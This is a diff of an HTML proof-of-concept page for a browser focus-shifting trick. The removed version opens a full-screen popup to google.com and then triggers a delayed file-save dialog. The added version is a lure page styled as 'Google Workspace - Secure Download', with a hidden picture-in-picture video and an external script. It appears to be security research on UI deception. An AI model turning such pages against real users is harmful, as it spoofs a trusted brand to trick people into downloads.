@@ -1,71 +1,26 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>PoC</title>
-  <style>
-    body {
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      height:100vh;
-      font-family: sans-serif;
-    }
-    button {
-      padding: 14px 22px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Google Workspace - Secure Download</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 100px; }
+        .btn { background-color: #1a73e8; color: white; padding: 15px 32px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        .btn:hover { background-color: #1765cc; }
+        video { display: none; } /* Video disembunyikan, hanya butuh streamnya untuk PiP */
+    </style>
 </head>
 <body>
+    <h1>Download Document</h1>
+    <p>Please click the button below to start your secure download from Google Mail.</p>
+    
+    <!-- Tombol yang memicu dua aksi sekaligus -->
+    <button class="btn" id="downloadBtn">Download Securely</button>
 
-<button id="go">Go to Google</button>
+    <video id="pipVideo" loop muted playsinline>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
 
-<script>
-  const TRUSTED_URL = "https://www.google.com";
-  const DELAY_MS = 5000;
-
-  function openTrustedPopup() {
-    const w = screen.availWidth;
-    const h = screen.availHeight;
-    window.open(
-      TRUSTED_URL,
-      "popup",
-      `width=${w},height=${h},left=0,top=0,resizable=yes,scrollbars=yes`
-    );
-  }
-
-  async function triggerFileSave() {
-    if (!('showSaveFilePicker' in window)) return;
-
-    try {
-      const handle = await window.showSaveFilePicker({
-        suggestedName: 'document.bin',
-        types: [{
-          description: 'Binary File',
-          accept: { 'application/octet-stream': ['.bin'] }
-        }]
-      });
-
-      const writable = await handle.createWritable();
-      await writable.write('This is only test content');
-      await writable.close();
-    } catch (e) {
-      // user canceled
-    }
-  }
-
-  document.getElementById("go").addEventListener("click", () => {
-    // 1) shift focus to trusted origin
-    openTrustedPopup();
-
-    // 2) delayed sensitive action from background window
-    setTimeout(() => {
-      triggerFileSave();
-    }, DELAY_MS);
-  });
-</script>
-
+    <script src="script.js"></script>
 </body>
 </html>
